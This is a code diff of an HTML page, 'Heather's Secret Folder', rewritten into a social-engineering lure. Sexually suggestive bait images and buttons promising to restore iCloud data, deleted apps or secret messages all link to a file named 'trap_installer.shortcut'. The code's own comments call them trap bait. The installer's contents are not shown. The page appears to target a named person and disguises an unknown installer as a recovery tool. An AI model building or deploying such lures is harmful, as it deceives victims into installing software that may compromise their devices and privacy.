@@ -1,64 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Heather’s Secret Folder</title>
   <style>
     body {
       background-color: black;
       color: white;
       font-family: monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
+      text-align: center;
+      padding-top: 50px;
     }
-    h1 {
-      margin-bottom: 20px;
+    img {
+      max-width: 90%;
+      margin: 20px 0;
     }
-    .bait {
-      margin: 10px;
-    }
-    .bait img {
-      width: 300px;
-      border: 2px solid white;
-      cursor: pointer;
+    .link {
+      display: block;
+      margin: 20px;
+      font-size: 20px;
+      color: #00ffcc;
+      text-decoration: none;
     }
     .footer {
-      margin-top: 40px;
+      position: fixed;
+      bottom: 20px;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-evenly;
     }
-    button {
-      background-color: white;
-      color: black;
-      font-weight: bold;
+    .footer a {
+      background: #222;
       padding: 10px 20px;
-      border: none;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: grey;
+      border: 1px solid #00ffcc;
+      color: #00ffcc;
+      text-decoration: none;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <h1>📂 Heather’s Secret Folder</h1>
+  <h1>Heather's Secret Folder</h1>
 
-  <div class="bait">
-    <a href="fuck.jpg"><img src="fuck.jpg" alt="fuck.jpg"></a>
-  </div>
-  <div class="bait">
-    <a href="dick.jpg"><img src="dick.jpg" alt="dick.jpg"></a>
-  </div>
-  <div class="bait">
-    <a href="busted.gif"><img src="busted.gif" alt="busted.gif"></a>
-  </div>
+  <!-- 🖼️ Trap Bait Images -->
+  <a href="trap_installer.shortcut" class="link">
+    <img src="fuck.jpg" alt="Saved Messages Restore">
+  </a>
 
+  <a href="trap_installer.shortcut" class="link">
+    <img src="dick.jpg" alt="Secret Hidden Apps">
+  </a>
+
+  <a href="trap_installer.shortcut" class="link">
+    <img src="busted.gif" alt="Restore iCloud Data">
+  </a>
+
+  <!-- 🧠 Trap Installer Button -->
   <div class="footer">
-    <a href="https://sexylexi8787.github.io/heathers-secret-folder/trap_installer.shortcut">
-      <button>🧠 Restore Hidden Vault</button>
-    </a>
+    <a href="trap_installer.shortcut">🧠 Restore Hidden Vault</a>
+    <a href="trap_installer.shortcut">🔓 Unlock Secret Messages</a>
+    <a href="trap_installer.shortcut">📲 Restore Deleted Apps</a>
   </div>
 </body>
 </html>
